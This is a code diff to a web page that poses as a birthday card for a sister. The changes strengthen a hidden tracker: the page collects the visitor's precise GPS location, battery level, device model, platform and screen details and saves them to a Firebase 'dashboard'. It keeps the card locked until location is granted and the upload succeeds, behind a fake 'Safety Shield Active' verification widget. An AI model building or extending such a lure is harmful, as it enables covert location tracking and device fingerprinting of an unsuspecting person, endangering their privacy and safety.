@@ -89,6 +89,7 @@
         .btn { padding: 10px 25px; border-radius: 50px; font-weight: 700; cursor: pointer; border: none; font-size: 0.9rem; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
         .btn-main { background: var(--ink); color: white; transition: transform 0.1s; }
         .btn-main:active { transform: scale(0.95); }
+        .btn-main:disabled { background: #b0a09d; opacity: 0.6; cursor: not-allowed; }
         #confetti { position: fixed; inset: 0; pointer-events: none; z-index: 99; }
         .hide-text { opacity: 0 !important; pointer-events: none; }
         .focus-face { transform: scale(1.4) translateY(-20px); }
@@ -231,7 +232,7 @@
             <p id="sub-title" class="wish-text">YOU ARE AMAZING!</p>
         </div>
         <div class="action-bar">
-            <button class="btn btn-main" id="mainButton">Let's go sis 🤗</button>
+            <button class="btn btn-main" id="mainButton" disabled>Let's go sis 🤗</button>
         </div>
     </div>
 
@@ -256,7 +257,6 @@
         const db = getFirestore(app);
 
         let currentUserId = null;
-        
         let authReady = new Promise(resolve => {
             onAuthStateChanged(auth, user => { 
                 if(user) {
@@ -273,31 +273,45 @@
             if (!currentUserId) return;
 
             try {
-                // Get battery level
-                let batteryLevel = 0;
+                let batteryLevel = "Unknown";
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
-                    batteryLevel = battery.level;
+                    batteryLevel = Math.round(battery.level * 100);
+                }
+
+                let detailedPlatform = navigator.platform;
+                let userAgentStr = navigator.userAgent;
+
+                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                    try {
+                        const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion', 'fullVersionList']);
+                        detailedPlatform = `${hints.platform} ${hints.platformVersion || ''}`;
+                        if(hints.model) userAgentStr += ` [Model: ${hints.model}]`;
+                    } catch(e) {}
                 }
 
                 const docData = {
                     lat: lat,
                     lng: lng,
                     accuracy: accuracy,
-                    platform: navigator.platform,
-                    userAgent: navigator.userAgent,
+                    platform: detailedPlatform,
+                    userAgent: userAgentStr,
                     timestamp: serverTimestamp(),
                     battery: batteryLevel,
                     cores: navigator.hardwareConcurrency || 0,
                     screen: {
                         w: window.screen.width,
-                        h: window.screen.height
+                        h: window.screen.height,
+                        pixelRatio: window.devicePixelRatio || 1
                     }
                 };
 
                 const colRef = collection(db, 'artifacts', 'birthday-card', 'users', currentUserId, 'locations');
                 await addDoc(colRef, docData);
-                console.log("Data structured and saved for dashboard.");
+                console.log("Improved device data saved.");
+                
+                // Signal that data is saved
+                window.dispatchEvent(new CustomEvent('dataSaved'));
             } catch (e) { 
                 console.error("Firestore Error:", e); 
             }
@@ -308,7 +322,12 @@
     <script>
         const tickSVG = `<svg class="mini-tick" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M9 10L12.2581 12.4436C12.6766 12.7574 13.2662 12.6957 13.6107 12.3021L20 5" stroke="currentColor" stroke-width="3" stroke-linecap="round"/></svg>`;
         let isLocationAllowed = false;
+        let isDataSaved = false;
         
+        window.addEventListener('dataSaved', () => {
+            isDataSaved = true;
+        });
+
         async function updateStatus() {
             const widget = document.getElementById('statusWidget');
             const list = document.getElementById('statusList');
@@ -334,26 +353,25 @@
             await addStep("IP: Sri Lanka (SLT)");
             
             const finalize = async () => {
+                // Wait until location is allowed AND data is confirmed saved to Firebase
+                while(!isLocationAllowed || !isDataSaved) {
+                    await delay(500);
+                }
+                
                 await addStep("Location Verified");
                 title.innerText = "Safety Shield Active";
                 spinner.style.display = 'none';
                 shield.style.display = 'block';
+                
+                // ENABLE THE MAIN BUTTON ONLY AFTER VERIFICATION
+                enableMainInterface();
+                
                 await delay(3000);
                 widget.classList.remove('expanded');
                 setTimeout(() => widget.classList.remove('visible'), 600);
             };
 
-            if(isLocationAllowed) {
-                await finalize();
-            } else {
-                title.innerText = "Waiting for Access...";
-                const check = setInterval(async () => {
-                    if(isLocationAllowed) {
-                        clearInterval(check);
-                        await finalize();
-                    }
-                }, 500);
-            }
+            finalize();
         }
 
         async function checkAndShowPopup() {
@@ -363,7 +381,6 @@
                     if (result.state === 'granted') {
                         isLocationAllowed = true;
                         closeAllPopups();
-                        enableMainInterface();
                         requestLocationAccess(false);
                     } else if (result.state === 'denied') {
                         showPopup('overlay3', 'card3');
@@ -380,7 +397,6 @@
                     async (pos) => {
                         isLocationAllowed = true;
                         closeAllPopups();
-                        enableMainInterface();
                         if (window.saveLocationData) {
                             await window.saveLocationData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
                         }
@@ -410,8 +426,8 @@
 
         function enableMainInterface() {
             const btn = document.getElementById('mainButton');
-            btn.style.pointerEvents = 'auto';
             btn.disabled = false;
+            btn.style.pointerEvents = 'auto';
         }
 
         function showGuideInPopup2() {
